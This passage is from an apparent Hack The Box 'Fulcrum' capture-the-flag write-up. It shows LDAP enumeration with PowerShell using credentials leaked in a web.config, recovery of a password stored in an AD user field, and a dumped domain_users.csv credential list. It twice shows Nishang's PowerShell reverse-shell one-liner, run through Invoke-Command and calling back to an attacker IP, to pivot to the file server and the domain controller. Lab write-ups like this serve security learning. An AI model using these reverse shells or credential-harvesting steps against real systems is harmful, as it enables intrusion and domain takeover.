[192.168.30.130]: PS C:\inetpub\wwwroot> type web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration xmlns="http://schemas.microsoft.com/.NetConfiguration/v2.0">
    <appSettings />
    <connectionStrings>
        <add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    </connectionStrings>
    <system.web>
        <membership defaultProvider="ADProvider">
            <providers>
                <add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
            </providers>
        </membership>
    </system.web>
...[snip]...
[192.168.30.130]: PS C:\inetpub\wwwroot>

```

#### Querying LDAP for Information

At the time, I didn't bother writing a proper ldap queries, so I did the un-elegant method of just running an ldap query for absolutely every object/filter, and manually inspecting it for interesting information. 

_Querying LDAP in Powershell_
```Powershell
$username = 'LDAP'
$password = 'PasswordForSearching123!'
$DomainControllerIpAddress = 'dc.fulcrum.local'
$LdapDn = 'dc=fulcrum,dc=local'
$dn = New-Object System.DirectoryServices.DirectoryEntry ("LDAP://$($DomainControllerIpAddress):389/$LdapDn",$username,$password)
$ds = new-object System.DirectoryServices.DirectorySearcher($dn)
$ds.filter = "((ObjectClass=*))"
$ds.SearchScope = "subtree"
$ds.PropertiesToLoad.Add("distinguishedName")
$ds.PropertiesToLoad.Add("sAMAccountName")
$ds.PropertiesToLoad.Add("lastLogon")
$ds.PropertiesToLoad.Add("memberOf")
$ds.PropertiesToLoad.Add("distinguishedname")
$ds.FindAll()
```
!["Fulcrum LDAP Query Output"](/assets/fulcrum/8.png "Fulcrum LDAP Query Output")

Output:
```
...[snip]...
LDAP://dc.fulcrum.local:389/CN=FILE,CN=Computers,DC=fulcrum,DC=local                                                                             {distinguishedname, samaccountname, adspath, lastlogon}
LDAP://dc.fulcrum.local:389/CN=Bobby Tables,OU=People,DC=fulcrum,DC=local                                                                        {distinguishedname, samaccountname, adspath, lastlogon}
LDAP://dc.fulcrum.local:389/OU=People,DC=fulcrum,DC=local                                                                                        {distinguishedname, adspath}
LDAP://dc.fulcrum.local:389/CN=LDAP Lookup,OU=People,DC=fulcrum,DC=local                                                                         {distinguishedname, samaccountname, adspath, lastlogon}
LDAP://dc.fulcrum.local:389/CN=be36,OU=People,DC=fulcrum,DC=local                                                                                {memberof, distinguishedname, samaccountname, adspath...}
LDAP://dc.fulcrum.local:389/CN=8631,OU=People,DC=fulcrum,DC=local                                                                                {memberof, distinguishedname, samaccountname, adspath...}
LDAP://dc.fulcrum.local:389/CN=9791,OU=People,DC=fulcrum,DC=local                                                                                {memberof, distinguishedname, samaccountname, adspath...}
LDAP://dc.fulcrum.local:389/CN=879f,OU=People,DC=fulcrum,DC=local                                                                                {memberof, distinguishedname, samaccountname, adspath...}
LDAP://dc.fulcrum.local:389/CN=953d,OU=People,DC=fulcrum,DC=local                                                                                {memberof, distinguishedname, samaccountname, adspath...}
LDAP://dc.fulcrum.local:389/CN=81b2,OU=People,DC=fulcrum,DC=local                                                                                {memberof, distinguishedname, samaccountname, adspath...}
LDAP://dc.fulcrum.local:389/CN=97f0,OU=People,DC=fulcrum,DC=local                                                                                {memberof, distinguishedname, samaccountname, adspath...}
```

From the output of our LDAP query we can see some interesting objects, include the name of the fileserver: _file.fulcrum.local_ , and a user different from the rest of the users "Bobby Tables". We can run a more filtered query on the common name (CN) "bobby", and we can now include all the properties mapped to this object. 


```Powershell
$username = 'LDAP'
$password = 'PasswordForSearching123!'
$DomainControllerIpAddress = 'dc.fulcrum.local'
$LdapDn = 'dc=fulcrum,dc=local'
$dn = New-Object System.DirectoryServices.DirectoryEntry ("LDAP://$($DomainControllerIpAddress):389/$LdapDn",$username,$password)
$ds = new-object System.DirectoryServices.DirectorySearcher($dn)
$ds.filter = "((cn=bobby*))"
$ds.SearchScope = "subtree"
$ds.PropertiesToLoad.Add("*")
$data = $ds.FindAll()
$data.Properties
```

Doing so gives us the following output...
```
Name                           Value
----                           -----
logoncount                     {18}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local}
description                    {Has logon rights to the file server}
usnchanged                     {143447}
instancetype                   {4}
name                           {Bobby Tables}
badpasswordtime                {131522885566857829}
pwdlastset                     {131514417841217344}
objectclass                    {top, person, organizationalPerson, user}
badpwdcount                    {0}
samaccounttype                 {805306368}
lastlogontimestamp             {131556801131693417}
usncreated                     {12878}
objectguid                     {88 53 29 79 114 147 100 75 187 41 125 239 148 113 13 111}
info                           {Password set to ++FileServerLogon12345++}
whencreated                    {10/2/2017 6:06:57 PM}
adspath                        {LDAP://dc.fulcrum.local:389/CN=Bobby Tables,OU=People,DC=fulcrum,DC=local}
useraccountcontrol             {66048}
cn                             {Bobby Tables}
countrycode                    {0}
primarygroupid                 {513}
whenchanged                    {11/20/2017 7:35:13 PM}
dscorepropagationdata          {10/2/2017 6:09:28 PM, 10/2/2017 6:06:57 PM, 1/1/1601 12:00:00 AM}
lastlogon                      {131556801131693417}
distinguishedname              {CN=Bobby Tables,OU=People,DC=fulcrum,DC=local}
samaccountname                 {BTables}
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 70 111 187 188 76 255 138 170 168 71 215 161 80 4 0 0}
lastlogoff                     {0}
displayname                    {Bobby Tables}
accountexpires                 {9223372036854775807}
userprincipalname              {BTables@fulcrum.local}

```

It seems that we might we have might discovered Bobby Tables credentials, and from the "description" he _should_ have logon rights to the file server (file.fulcrum.local). 

#### Pivoting to file.fulcrum.local with Nishang

Trying to enter another Powershell Remoting sessions gives us an error stating we can't do multi-hop PSRemoting Sessions.  We also don't have permissions to enable multi-session PSRemoting unfortunately because we aren't administrators.

```

[192.168.30.130]: PS C:\Users\WebUser\Documents> Enter-PSSession -Computername file.fulcrum.local -Credential fulcrum.local\btables
Enter-PSSession : You are currently in a Windows PowerShell PSSession and cannot use the Enter-PSSession cmdlet to enter another PSSession.
    + CategoryInfo          : InvalidArgument: (:) [Enter-PSSession], ArgumentException
    + FullyQualifiedErrorId : RemoteHostDoesNotSupportPushRunspace,Microsoft.PowerShell.Commands.EnterPSSessionCommand

[192.168.30.130]: PS C:\Users\WebUser\Documents> Enable-WSManCredSSP –Role Client –DelegateComputer spoke
Access is denied. You need to run this cmdlet from an elevated process.
    + CategoryInfo          : NotSpecified: (:) [Enable-WSManCredSSP], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.WSMan.Management.EnableWSManCredSSPCommand

```

We are able to call backout to the htb vpn ip space so we can use powershell invoke-command to execute commands on the box. We can get a reverse shell copy-pasta'ing ["Nishangs Invoke-PowershellTcpOneLine"](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
_Invoke-Command on file.fulcrum.local_
```
Invoke-Command -ComputerName file.fulcrum.local -Credential fulcrum.local\btables -Port 5985 -ScriptBlock  { $client = New-Object System.Net.Sockets.TCPClient('10.10.15.74',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```

_getting shell_
```
root@dastinia:~# ncat -lnvp 53
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.10.62.
Ncat: Connection from 10.10.10.62:12873.
whoami
fulcrum\btables
PS C:\Users\BTables\Documents>
```




_getting user flag_
```
PS C:\Users\BTables\Desktop> dir


    Directory: C:\Users\BTables\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/4/2017  10:12 PM             34 user.txt


PS C:\Users\BTables\Desktop> type user.txt
...[snip]...
```

### Pivoting to Domain Controller (dc.fulcrum.local)

Exploring the system you discover a myriad  of files of which the  contents of `domain_users.csv` appears to be a list of username, and passwords for various domain users. 

```
PS C:\Users\BTables> dir


    Directory: C:\Users\BTables


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        10/4/2017  10:12 PM                Desktop
d-r---        10/9/2017   8:22 PM                Documents
d-r---        7/16/2016   2:18 PM                Downloads
d-r---        7/16/2016   2:18 PM                Favorites
d-r---        7/16/2016   2:18 PM                Links
d-r---        7/16/2016   2:18 PM                Music
d-r---        7/16/2016   2:18 PM                Pictures
d-----        7/16/2016   2:18 PM                Saved Games
d-r---        7/16/2016   2:18 PM                Videos
-a----       10/12/2017   8:09 PM           5502 check-auth.ps1
-a----       10/12/2017   7:48 PM          45011 domain_users.csv
-a----       10/12/2017   7:21 PM          21002 file.txt
-a----       10/12/2017   7:21 PM          21002 file2.txt
-a----       10/12/2017   7:48 PM          45011 merged.txt
-a----       10/12/2017   7:43 PM          90002 merged2.txt
-a----       10/12/2017   7:39 PM          21002 Output.txt
-a----       10/12/2017   7:23 PM          75002 pass.txt
-a----       10/12/2017   7:23 PM          75002 pass2.txt
-a----       10/12/2017   9:16 PM          21000 result.txt
-a----       10/12/2017   9:04 PM             42 test.csv
-a----       10/12/2017   7:14 PM          18002 users.txt
-a----       10/12/2017   7:22 PM              0 wordlist.txt
```
_contents of "domain_users.csv"_
```
...[snip]...
a7e6,@fulcrum_e9f86a021507_$
9cea,@fulcrum_1eee5eabb089_$
9e92,@fulcrum_efecb22c5b82_$
8d25,@fulcrum_70e0e02bd594_$
9923,@fulcrum_17f672dfcc78_$
b0b6,@fulcrum_7a5f2af5237e_$
9e2a,@fulcrum_acd5008a3f9d_$
a700,@fulcrum_47ff4e46a43f_$
b473,@fulcrum_110bf7e71ecd_$
984a,@fulcrum_d254c73f8dab_$
```

I forgot to mention, but from our either enumeration we could have discovered what users are in the domain admins by querying ldap. I forgot to gather the exact query I used, but to give an baseline idea of what the ldap query  structure would have looked like: `(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=People,DC=fulcrum,dc=local))`, but either way, by bruteforcing the credentials with a script, or querying  LDAP you would discover that the user `932a` is in the domain administrators group. 

```
PS C:\Users\BTables> type domain_users.csv | findstr "923a"
9f68,@fulcrum_df0923a7ca40_$
923a,@fulcrum_bf392748ef4e_$
```
_getting shell on the domain controller dc.fulcrum.local_
```
Invoke-Command -ComputerName dc.fulcrum.local -Credential 923a -Port 5985 -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.15.74',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```

```
root@dastinia:~# nc -lnvp 53
listening on [any] 53 ...
connect to [10.10.15.74] from (UNKNOWN) [10.10.10.62] 1559

PS C:\Users\923a\Documents> whoami
fulcrum\923a
PS C:\Users\923a\Documents>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                     Type             SID                                           Attributes
============================================== ================ ============================================= ===============================================================
Everyone                                       Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                  Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                         Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
FULCRUM\Domain Admins                          Group            S-1-5-21-3166400326-2861236044-2715240360-512 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity     Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
FULCRUM\Denied RODC Password Replication Group Alias            S-1-5-21-3166400326-2861236044-2715240360-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level           Label            S-1-16-12288
PS C:\Users\923a>
```
Box finally complete :)

```
PS C:\Users\Administrator\Desktop> type root.txt
...[snip]...
```



